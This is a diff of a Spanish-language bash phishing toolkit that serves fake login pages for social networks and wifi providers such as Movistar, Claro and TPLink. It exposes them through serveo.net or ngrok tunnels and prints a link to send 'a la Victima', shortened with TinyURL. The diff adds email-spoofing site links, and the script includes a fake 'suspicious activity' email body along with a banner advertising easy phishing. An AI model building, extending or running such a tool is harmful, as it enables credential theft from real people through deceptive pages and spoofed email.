@@ -14,7 +14,7 @@ menu() {
 printf "\e[1;93m\e[0m\e[1;92mPuedes escojer entre Redes Sociales e Inicio de session wifi\e[0m \e[1;93m\e[0m\n"
 printf "\n"
 printf "\e[1;93m\e[0m\e[1;92m=============================================\e[0m \e[1;93m\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Redes Sociales\e[0m \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Paginas de Wifi\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Redes Sociales\e[0m      \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Paginas de Wifi\n"
 printf "\e[1;93m\e[0m\e[1;92m=============================================\e[0m \e[1;93m\e[0m\n"
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escoja una de las opciones: \e[0m\en' option
@@ -157,7 +157,7 @@ printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Claro\e[0m      \e[1
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m DirecTV\e[0m        [\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m GoogleWlan\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Movistar\e[1;92m\n"
-printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Telecom\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Telekom\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Telmex\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m TPLink\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Tigo\e[0m\n"
@@ -180,7 +180,7 @@ elif [[ $option == 4 || $option == 04 ]]; then
 server="Movistar"
 start1
 elif [[ $option == 5 || $option == 05 ]]; then
-server="Telecom"
+server="Telekom"
 start1
 elif [[ $option == 6 || $option == 06 ]]; then
 server="Telmex"
@@ -238,13 +238,13 @@ printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
 printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
 printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
 printf "                                       |:  |:  1   |   |:  |    \n"
-printf "     \e[0m\e[1;77m Phishing\e[1;31m    |::.|::.. . |   |::.|    \n"
+printf "     \e[0m\e[1;77m Hecho por Javic      \e[1;31m                |::.|::.. . |   |::.|    \n"
 printf "                                        --- -------     ---     \n"
                                           
 printf "\n"
-printf "\e[1;77m       ...........\e[0m\e[1;93m modificado 02-09-2019 V1.0.17\e[0m\e[1;77m.........\e[0m\n" 
-printf "\e[1;77m       .............\e[0m\e[1;93m Phishing Andres \e[0m\e[1;77m....................\e[0m\n"                              
-printf "\e[1;93m       ...\e[0m\e[1;92m Aun en beta este shell, villavicencio (meta)\e[0m \e[1;93m....\e[0m\n"
+printf "\e[1;77m       .........\e[0m\e[1;93m Dedicado al Grupo de Error404\e[0m\e[1;77m...........\e[0m\n" 
+printf "\e[1;77m       .............\e[0m\e[1;93m Phishing facil de usar \e[0m\e[1;77m.............\e[0m\n"                              
+printf "\e[1;93m       .....\e[0m\e[1;92m Porque el conocimiento debe ser libre\e[0m \e[1;93m......\e[0m\n"
 printf "\n"
 
 }
@@ -358,16 +358,18 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "Necesita SSH pero no está instal
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' .localtunnel.me 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 10
-send_link=$(grep -o "https://[0-9a-z]*\.localtunnel.me" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Envía el enlace directo al objetivo:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s https://tinyurl.com/api-create.php?url=$send_link | head -n1)
+send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
 printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
 printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
@@ -390,7 +392,7 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_port="8000" #$(seq 1111 4444 | sort -R | head -n1)
+default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
 printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escojer un puerto (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
@@ -416,7 +418,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Necesita unzip pero no está instalado. Instalarlo. Saliendo."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "Necesita wget pero no está instalado. Instalarlo. Saliendo."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok espere un momento...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -457,6 +459,8 @@ link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngr
 printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en os siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
 printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
 printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
@@ -478,7 +482,7 @@ printf "\n"
 printf "\e[1;93m\e[0m\e[1;92mPuedes escojer para el reenvio de puertos una de las opciones\e[0m \e[1;93m\e[0m\n"
 printf "\n"
 printf "\e[1;93m\e[0m\e[1;92m======================================\e[0m \e[1;93m\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m localtunnel.me (Tunelización SSH...)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (Tunelización SSH...)\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;93m\e[0m\e[1;92m======================================\e[0m \e[1;93m\e[0m\n"
 default_option_server="1"
